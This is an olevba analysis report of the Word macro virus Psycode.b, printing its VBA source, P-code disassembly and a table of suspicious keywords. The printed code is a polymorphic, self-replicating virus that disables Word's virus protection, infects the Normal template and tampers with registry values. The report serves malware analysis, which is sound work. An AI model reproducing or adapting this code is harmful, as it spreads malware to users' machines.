olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Psycode.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Psycode.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modul 1.bas 
in file: Virus.MSWord.Psycode.b - OLE stream: 'Macros/VBA/Modul 1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub document_close(): p2: End Sub
Private Sub autoclose(): p2: End Sub
Private Sub document_open(): p2: End Sub
Private Sub autoopen(): p2: End Sub
Private Sub p2()
Application.ShowVisualBasicEditor = 0: Options.VirusProtection = 0: Application.EnableCancelKey = 0
On Error Resume Next
Options.VirusProtection = 0: Application.EnableCancelKey = 0
With NormalTemplate.VBProject.vbcomponents.Item(1).codemodule
newcode
z = .procstartline("autoexec", 0)
Set dc = ActiveDocument.VBProject.vbcomponents.Item(1).codemodule
dc.deletelines 1, dc.countoflines
dc.addfromstring (.lines(z, z + 13))
r = 1 + Int(Rnd * 2)
For x = 0 To 3
dc.addfromstring (.lines((x Xor r) + 1, 1))
Next x
.deletelines 1, 4
.addfromstring (dc.lines(1, 3))
.addfromstring (dc.lines(4, 1))
.replaceline .procstartline("extra", 0) + 1, "set dc=activedocument"
extra
End With
dc.replaceline dc.procstartline("autoexec", 0), "private sub p2"
'With ActiveDocument: If Left(.FullName, 2, 1) = ":" Then .SaveAs .FullName: End With
End Sub
Private Sub newcode()
With NormalTemplate.VBProject.vbcomponents.Item(1).codemodule
a = Chr(34)
z = .procstartline("autoexec", 0)
c = (128 + Int(Rnd * 128))
For x = 0 To 3
q = Chr(97 + (x * 5) + Int(Rnd * 5))
.replaceline z + x + 1, q & "=" & a & a
u = u & " & " & q
Next x
.replaceline z + 5, "z=" & Mid(u, 4)
.replaceline z + 7, "y = y & chr(asc(mid(z, x, 1)) xor " & c & ")"
s = UCase(.lines(1, (z + 12)))
.replaceline z + 6, "for x=1 to " & Len(s)
For k = 1 To Len(s)
t = Mid(s, k, 1)
If Asc(t) < 90 And Asc(t) > 65 Then t = Chr(Asc(t) + Int(Rnd * 2) * 32)
p = p & t
Next k
For x = 1 To Len(p): b = b & Chr(Asc(Mid(p, x, 1)) Xor c): Next x
For x = 0 To 3
.replaceline z + x + 1, Mid(u, 4 * (x + 1), 1) & "=" & a & Mid(b, (1016 * x) + 1, 1016) & a
Next x
End With
End Sub
Private Sub extra()
Set dc = ActiveDocument
Set dcc = dc.VBProject.vbcomponents
For x = 2 To dcc.Count: dcc.Remove dcc.Item(2): Next x
With dcc.Item(1).codemodule
z = .procstartline("autoexec", 0)
For x = z + 5 To z + 12
crap = ""
For y = 0 To 20 + Int(Rnd * 30)
crap = crap & Chr(32 + Int(Rnd * 224))
Next y
.replaceline x, .lines(x, 1) & "'" & crap
Next x
End With
End Sub
Private Sub autoexit()
newcode
With NormalTemplate.VBProject.vbcomponents.Item(1).codemodule
.replaceline .procstartline("extra", 0) + 1, "set dc=normaltemplate"
extra
.deletelines 1, (.procstartline("autoexec", 0) - 1)
End With
NormalTemplate.Save
End Sub
Private Sub toolsoptions()
Options.VirusProtection = 1
Dialogs(974).Show
Options.VirusProtection = 0
End Sub
Private Sub toolsmacro()
System.PrivateProfileString("", "hkey_local_machine\software\microsoft\windows\currentversion", "ProductID") = "Manche Sachen sind nicht immer wie sie aussehen"
End Sub
Sub viewvbcode()
a = "hkey_current_user\software\microsoft\windows\currentversion\explorer\runmru"
System.PrivateProfileString("", a, "a") = "w97m/psycode v2.e2 wed aug 18 99 [swl/lz0/dvc]"
System.PrivateProfileString("", a, "mrulist") = "a"
End Sub
Private Sub autoexec()
e = ""
j = ""
n = ""
r = ""
z = e & j & n & r
For x = 1 To 3365
y = y & Chr(Asc(Mid(z, x, 1)) Xor 183)
Next x
With NormalTemplate.VBProject.vbcomponents.Item(1).codemodule
.deletelines 1, .countoflines: .addfromstring y
End With
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Psycode.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Modul 1 - 7154 bytes
' Line #0:
' 	FuncDefn (Private Sub document_close())
' 	BoS 0x0000 
' 	ArgsCall p2 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #1:
' 	FuncDefn (Private Sub autoclose())
' 	BoS 0x0000 
' 	ArgsCall p2 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #2:
' 	FuncDefn (Private Sub document_open())
' 	BoS 0x0000 
' 	ArgsCall p2 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #3:
' 	FuncDefn (Private Sub autoopen())
' 	BoS 0x0000 
' 	ArgsCall p2 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #4:
' 	FuncDefn (Private Sub p2())
' Line #5:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #6:
' 	OnError (Resume Next) 
' Line #7:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #8:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #9:
' 	ArgsCall newcode 0x0000 
' Line #10:
' 	LitStr 0x0008 "autoexec"
' 	LitDI2 0x0000 
' 	ArgsMemLdWith procstartline 0x0002 
' 	St z 
' Line #11:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	Set dc 
' Line #12:
' 	LitDI2 0x0001 
' 	Ld dc 
' 	MemLd countoflines 
' 	Ld dc 
' 	ArgsMemCall deletelines 0x0002 
' Line #13:
' 	Ld z 
' 	Ld z 
' 	LitDI2 0x000D 
' 	Add 
' 	ArgsMemLdWith lines 0x0002 
' 	Paren 
' 	Ld dc 
' 	ArgsMemCall addfromstring 0x0001 
' Line #14:
' 	LitDI2 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0002 
' 	Mul 
' 	FnInt 
' 	Add 
' 	St r 
' Line #15:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0003 
' 	For 
' Line #16:
' 	Ld x 
' 	Ld r 
' 	Xor 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith lines 0x0002 
' 	Paren 
' 	Ld dc 
' 	ArgsMemCall addfromstring 0x0001 
' Line #17:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #18:
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	ArgsMemCallWith deletelines 0x0002 
' Line #19:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	Ld dc 
' 	ArgsMemLd lines 0x0002 
' 	Paren 
' 	ArgsMemCallWith addfromstring 0x0001 
' Line #20:
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	Ld dc 
' 	ArgsMemLd lines 0x0002 
' 	Paren 
' 	ArgsMemCallWith addfromstring 0x0001 
' Line #21:
' 	LitStr 0x0005 "extra"
' 	LitDI2 0x0000 
' 	ArgsMemLdWith procstartline 0x0002 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x0015 "set dc=activedocument"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #22:
' 	ArgsCall extra 0x0000 
' Line #23:
' 	EndWith 
' Line #24:
' 	LitStr 0x0008 "autoexec"
' 	LitDI2 0x0000 
' 	Ld dc 
' 	ArgsMemLd procstartline 0x0002 
' 	LitStr 0x000E "private sub p2"
' 	Ld dc 
' 	ArgsMemCall replaceline 0x0002 
' Line #25:
' 	QuoteRem 0x0000 0x0054 "With ActiveDocument: If Left(.FullName, 2, 1) = ":" Then .SaveAs .FullName: End With"
' Line #26:
' 	EndSub 
' Line #27:
' 	FuncDefn (Private Sub newcode())
' Line #28:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #29:
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	St a 
' Line #30:
' 	LitStr 0x0008 "autoexec"
' 	LitDI2 0x0000 
' 	ArgsMemLdWith procstartline 0x0002 
' 	St z 
' Line #31:
' 	LitDI2 0x0080 
' 	Ld Rnd 
' 	LitDI2 0x0080 
' 	Mul 
' 	FnInt 
' 	Add 
' 	Paren 
' 	St c 
' Line #32:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0003 
' 	For 
' Line #33:
' 	LitDI2 0x0061 
' 	Ld x 
' 	LitDI2 0x0005 
' 	Mul 
' 	Paren 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x0005 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	St q 
' Line #34:
' 	Ld z 
' 	Ld x 
' 	Add 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld q 
' 	LitStr 0x0001 "="
' 	Concat 
' 	Ld a 
' 	Concat 
' 	Ld a 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #35:
' 	Ld u 
' 	LitStr 0x0003 " & "
' 	Concat 
' 	Ld q 
' 	Concat 
' 	St u 
' Line #36:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #37:
' 	Ld z 
' 	LitDI2 0x0005 
' 	Add 
' 	LitStr 0x0002 "z="
' 	Ld u 
' 	LitDI2 0x0004 
' 	ArgsLd Mid$ 0x0002 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #38:
' 	Ld z 
' 	LitDI2 0x0007 
' 	Add 
' 	LitStr 0x0022 "y = y & chr(asc(mid(z, x, 1)) xor "
' 	Ld c 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #39:
' 	LitDI2 0x0001 
' 	Ld z 
' 	LitDI2 0x000C 
' 	Add 
' 	Paren 
' 	ArgsMemLdWith lines 0x0002 
' 	ArgsLd UCase 0x0001 
' 	St s 
' Line #40:
' 	Ld z 
' 	LitDI2 0x0006 
' 	Add 
' 	LitStr 0x000B "for x=1 to "
' 	Ld s 
' 	FnLen 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #41:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld s 
' 	FnLen 
' 	For 
' Line #42:
' 	Ld s 
' 	Ld k 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St t 
' Line #43:
' 	Ld t 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x005A 
' 	Lt 
' 	Ld t 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0041 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld t 
' 	ArgsLd Asc 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0002 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0020 
' 	Mul 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	St t 
' 	EndIf 
' Line #44:
' 	Ld p 
' 	Ld t 
' 	Concat 
' 	St p 
' Line #45:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	NextVar 
' Line #46:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld p 
' 	FnLen 
' 	For 
' 	BoS 0x0000 
' 	Ld B 
' 	Ld p 
' 	Ld x 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	Ld c 
' 	Xor 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St B 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #47:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0003 
' 	For 
' Line #48:
' 	Ld z 
' 	Ld x 
' 	Add 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld u 
' 	LitDI2 0x0004 
' 	Ld x 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Mul 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "="
' 	Concat 
' 	Ld a 
' 	Concat 
' 	Ld B 
' 	LitDI2 0x03F8 
' 	Ld x 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x03F8 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	Ld a 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #49:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #50:
' 	EndWith 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Private Sub extra())
' Line #53:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set dc 
' Line #54:
' 	SetStmt 
' 	Ld dc 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	Set dcc 
' Line #55:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld dcc 
' 	MemLd Count 
' 	For 
' 	BoS 0x0000 
' 	LitDI2 0x0002 
' 	Ld dcc 
' 	ArgsMemLd Item 0x0001 
' 	Ld dcc 
' 	ArgsMemCall Remove 0x0001 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #56:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld dcc 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #57:
' 	LitStr 0x0008 "autoexec"
' 	LitDI2 0x0000 
' 	ArgsMemLdWith procstartline 0x0002 
' 	St z 
' Line #58:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	Ld z 
' 	LitDI2 0x0005 
' 	Add 
' 	Ld z 
' 	LitDI2 0x000C 
' 	Add 
' 	For 
' Line #59:
' 	LitStr 0x0000 ""
' 	St crap 
' Line #60:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0014 
' 	Ld Rnd 
' 	LitDI2 0x001E 
' 	Mul 
' 	FnInt 
' 	Add 
' 	For 
' Line #61:
' 	Ld crap 
' 	LitDI2 0x0020 
' 	Ld Rnd 
' 	LitDI2 0x00E0 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St crap 
' Line #62:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #63:
' 	Ld x 
' 	Ld x 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith lines 0x0002 
' 	LitStr 0x0001 "'"
' 	Concat 
' 	Ld crap 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #64:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #65:
' 	EndWith 
' Line #66:
' 	EndSub 
' Line #67:
' 	FuncDefn (Private Sub autoexit())
' Line #68:
' 	ArgsCall newcode 0x0000 
' Line #69:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #70:
' 	LitStr 0x0005 "extra"
' 	LitDI2 0x0000 
' 	ArgsMemLdWith procstartline 0x0002 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x0015 "set dc=normaltemplate"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #71:
' 	ArgsCall extra 0x0000 
' Line #72:
' 	LitDI2 0x0001 
' 	LitStr 0x0008 "autoexec"
' 	LitDI2 0x0000 
' 	ArgsMemLdWith procstartline 0x0002 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	ArgsMemCallWith deletelines 0x0002 
' Line #73:
' 	EndWith 
' Line #74:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #75:
' 	EndSub 
' Line #76:
' 	FuncDefn (Private Sub toolsoptions())
' Line #77:
' 	LitDI2 0x0001 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #78:
' 	LitDI2 0x03CE 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #79:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #80:
' 	EndSub 
' Line #81:
' 	FuncDefn (Private Sub toolsmacro())
' Line #82:
' 	LitStr 0x002F "Manche Sachen sind nicht immer wie sie aussehen"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "hkey_local_machine\software\microsoft\windows\currentversion"
' 	LitStr 0x0009 "ProductID"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #83:
' 	EndSub 
' Line #84:
' 	FuncDefn (Sub viewvbcode())
' Line #85:
' 	LitStr 0x004B "hkey_current_user\software\microsoft\windows\currentversion\explorer\runmru"
' 	St a 
' Line #86:
' 	LitStr 0x002E "w97m/psycode v2.e2 wed aug 18 99 [swl/lz0/dvc]"
' 	LitStr 0x0000 ""
' 	Ld a 
' 	LitStr 0x0001 "a"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #87:
' 	LitStr 0x0001 "a"
' 	LitStr 0x0000 ""
' 	Ld a 
' 	LitStr 0x0007 "mrulist"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #88:
' 	EndSub 
' Line #89:
' 	FuncDefn (Private Sub autoexec())
' Line #90:
' 	LitStr 0x0000 ""
' 	St e 
' Line #91:
' 	LitStr 0x0000 ""
' 	St j 
' Line #92:
' 	LitStr 0x0000 ""
' 	St n 
' Line #93:
' 	LitStr 0x0000 ""
' 	St r 
' Line #94:
' 	Ld e 
' 	Ld j 
' 	Concat 
' 	Ld n 
' 	Concat 
' 	Ld r 
' 	Concat 
' 	St z 
' Line #95:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0D25 
' 	For 
' Line #96:
' 	Ld y 
' 	Ld z 
' 	Ld x 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x00B7 
' 	Xor 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St y 
' Line #97:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #98:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #99:
' 	LitDI2 0x0001 
' 	MemLdWith countoflines 
' 	ArgsMemCallWith deletelines 0x0002 
' 	BoS 0x0000 
' 	Ld y 
' 	ArgsMemCallWith addfromstring 0x0001 
' Line #100:
' 	EndWith 
' Line #101:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|AutoExec  |autoexit            |Runs when the Word document is closed        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|AutoExec  |document_close      |Runs when the Word document is closed        |
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

